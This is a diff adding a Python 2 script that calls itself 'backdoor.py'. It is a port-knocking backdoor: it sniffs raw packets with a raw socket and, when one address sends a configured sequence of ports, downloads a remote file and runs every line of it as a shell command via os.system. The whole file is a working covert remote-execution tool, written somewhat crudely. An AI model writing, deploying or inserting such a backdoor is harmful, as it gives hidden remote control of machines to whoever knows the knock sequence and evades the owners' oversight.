@@ -1,0 +1,119 @@
+#!/usr/bin/python
+
+import socket
+from struct import *
+import sys
+import urllib2
+import os
+	 
+	#Convert a string of 6 characters of ethernet address into a dash separated hex string
+def eth_addr (a) :
+  b = "%.2x-%.2x-%.2x-%.2x-%.2x-%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]),ord(a[4]) , ord(a[5]))
+  return b
+	 
+	#create an PACKET , RAW SOCKET
+	#define ETH_P_ALL    0x0003          /* Every packet*/
+s = socket.socket( socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))
+
+if(len(sys.argv) < 3) :
+        print 'Usage : python backdoor.py config-file URL'
+        sys.exit()
+		
+contents = open(sys.argv[1])
+array = []
+index=0
+for line in contents:
+	array.append(line)
+	print(array[index])
+	index+=1
+	
+print array
+p1 = 0	
+lenght= len(array)
+	# receive a packet
+while True:
+  
+ p2 = 0
+ 
+ def get_packet():
+  packet = s.recvfrom(65565)
+	   
+	  #packet string from tuple
+  packet = packet[0]
+	   
+	  #parse ethernet header
+  eth_length = 14
+	   
+  eth_header = packet[:eth_length]
+  eth = unpack('!6s6sH' , eth_header)
+  eth_protocol = socket.ntohs(eth[2])
+     
+	  #Parse IP packets
+  if eth_protocol == 8:
+	ip_header = packet[eth_length:20+eth_length]
+	iph = unpack('!BBHHHBBH4s4s' , ip_header)
+	version_ihl = iph[0]
+	version = version_ihl >> 4
+	ihl = version_ihl & 0xF
+	iph_length = ihl * 4
+	ttl = iph[5]
+	protocol = iph[6]
+	s_addr = socket.inet_ntoa(iph[8])
+	d_addr = socket.inet_ntoa(iph[9])
+	u = iph_length + eth_length
+	udph_length = 8
+	udp_header = packet[u:u+8]
+	udph = unpack('!HHHH' , udp_header)
+	source_port = udph[0]
+	dest_port = int(udph[1])
+	length = udph[2]
+	checksum = udph[3]
+  else : 
+	dest_port=21121232333
+	s_addr='N/A'
+  return [s_addr,dest_port]
+	
+ 
+ #if port > 2999 and port < 3010: print 'address:' + addr + 'port:' + str(port)
+ 
+ print 'outside for loop'
+ 
+ for port in array:
+	if p2 ==1 and p1 < lenght: break
+	while True:
+	   if p1 == lenght: 
+		print 'Hurray...!!!'
+		txt = urllib2.urlopen(sys.argv[2])
+		for l in txt.readlines():
+			os.system(str(l))
+		sys.exit()
+	   else:
+			if(p1==0):
+				#print 'getting 1st packet: ' + port
+				addr,port1 = get_packet()
+				#print 'port1 : ' + str(port1)
+			
+				if port1 == int(port):
+					#print '1st match'
+					addr1=addr
+					p1+=1
+					#print '1st done...!!!'
+					break
+				else : 
+					#print 'breaking on 1st'
+					continue
+			else:
+			
+				addr,port1 = get_packet()
+				#print 'Inside 1221 ' + addr1 + ': ' + port + ': ' + str(port1)
+				if addr1 == addr and port1 == int(port):
+					p1+=1
+					#print 'inside port1'
+					break
+				elif addr1 == addr :
+					#print 'Sequence is out of order'
+					p1=0
+					p2=1
+					break
+				else: continue
+	continue
